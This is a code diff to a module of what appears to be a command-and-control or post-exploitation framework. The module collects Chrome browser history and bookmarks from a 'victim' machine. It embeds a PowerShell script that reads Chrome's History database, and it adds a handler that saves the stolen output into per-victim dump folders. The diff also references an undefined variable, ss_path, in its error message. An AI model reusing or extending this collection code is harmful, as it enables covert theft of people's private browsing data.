@@ -2,23 +2,55 @@ import sys
 import os
 import pdb
 import pathlib
+import time
 sys.path.append(os.path.join(str(pathlib.Path(__file__).parent.resolve()),'../../lib'))
 
 from module import Module
 
 
 class Browser_History(Module):
-    ## TODO call init of super??
-    def __init__(self,name,utility,language):
-        self.name = 'browser_history'
-        self.description = 'This module retrieves the browser history and bookmarks from chrome browser of the victim.'
-        self.utility = 'collection'
-        self.language = language
-        self.script = getattr(self,f"script_{language}")()
+
+	@classmethod
+	def module_options(cls):
+		h = {
+			'Path' : 'Path to dump the history and bookmarks.' 
+		}
+		return h
+
+	def __init__(self,name,utility,language):
+
+		description = 'This module retrieves the browser history and bookmarks from chrome browser of the victim.'
+
+		super(Browser_History, self).__init__(name,description,utility,language,getattr(self,f"script_{language}")())    
+
+	def handle_task_output(self,data,options,victim_id):
+		## Comes as a bytes object, so changing to string
+		output = data.decode('utf-8')
+
+
+		## Default Dumping path
+		dump_path = os.path.join(str(pathlib.Path(__file__).parent.resolve()),'../../victim_data',victim_id)
+
+		if not os.path.exists(dump_path):
+			os.makedirs(dump_path)
+
+		filename = "browserhistory_"+time.strftime("%Y%m%d-%H%M%S")+".txt"
+		file_path = os.path.join(dump_path,filename)
+
+		if 'Path' in  options:
+			if not os.path.exists(options['Path']):
+				print(f"Provided save path does not exists - {options['Path']}. Saving to default directory {ss_path}")
+			else:
+				file_path = os.path.join(options['Path'],filename)
+
+		f = open(file_path,'w+')
+		print(output,file=f)
+
+		return output
     
 
-    def script_powershell(self):
-    	return """function Get-ChromeHistory {
+	def script_powershell(self):
+		return """function Get-ChromeHistory {
 	    $Path = "$Env:systemdrive\\Users\\$UserName\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History"
 	    if (-not (Test-Path -Path $Path)) {
 	        Write-Verbose "[!] Could not find Chrome History for username: $UserName"
@@ -77,8 +109,8 @@ class Browser_History(Module):
 
 
 	return $history + $bookmarks"""
-    def script_python(self):
-        return """def execute_command():
+	def script_python(self):
+		return """def execute_command():
 		import platform
 		import os
 		import pdb
